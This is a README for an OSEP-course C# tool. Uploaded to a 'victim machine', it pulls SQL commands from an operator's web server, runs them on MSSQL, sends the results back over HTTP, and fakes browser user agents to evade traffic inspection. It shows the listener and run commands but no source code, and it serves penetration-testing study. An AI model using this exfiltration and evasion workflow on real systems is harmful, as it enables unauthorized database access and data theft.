I created this code as an alternative to the methods presented in the OSEP course. This code, when compiled, will login and run commands on an MSSQL DB and then send the results back over http/https(untested) to http-server.py in the Linux section of this repository. The other addition to this is BrowserDetection.cs which is supposed to look for installed web browsers and send a user agent string matching an installed browser. This just adds a bit of plausibility under traffic inspection. I don't know yet how far I'll go with evasion and obfuscation methods here.

### Usage

1. start http-server.py
   
`python3 ../../../OSEP-Code-And-Notes/Linux/Python/http-server.py --port 8000 --log requests.log`

1. Compile and Upload the C# code in this directory to the victim machine
   
3. Create a file with SQL commands one would like to have proccessed. The text file requires the following format:
	1. username (if using Integrated Security just use the string `username`)
	2. password (Integrated Security default this to `password`)
	3. MSSQL host
	4. commands...1 per line

Example command file:
```sql
username
password
mssql01.example.com
master
EXEC sp_linkedservers;
select myuser from openquery("mssql02", 'select SYSTEM_USER as myuser');
```

4. Run the code on the victim's machine: `Program.exe -w http://<address of webserver with command file> -g <command file>`
   
6. `tail` the logfile to find the output in Base64 and if the output is less than 4kb (arbitrary number set by me), there will be a plain text representation.
